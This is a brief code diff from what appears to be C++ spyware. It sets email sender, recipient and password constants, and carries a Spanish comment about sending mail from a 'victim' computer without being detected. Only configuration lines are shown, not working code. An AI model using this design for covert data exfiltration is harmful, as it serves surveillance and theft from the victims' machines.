@@ -15,7 +15,7 @@ namespace Mail {
 /*Datos de quién y a dónde se va a enviar el correo*/
 #define X_EM_TO "@gmail.com"
 #define X_EM_FROM "@gmail.com"
-#define X_EM_PASS ""
+#define X_EM_PASS " "
 
 	/*Para poder enviar el correo debemos utilizar sistemas convencionales pero sin ser detectados. Para
 	ello hay 3 opciones: utilziar librerias externas, lo cual requiere instalarlas en el ordenador victima
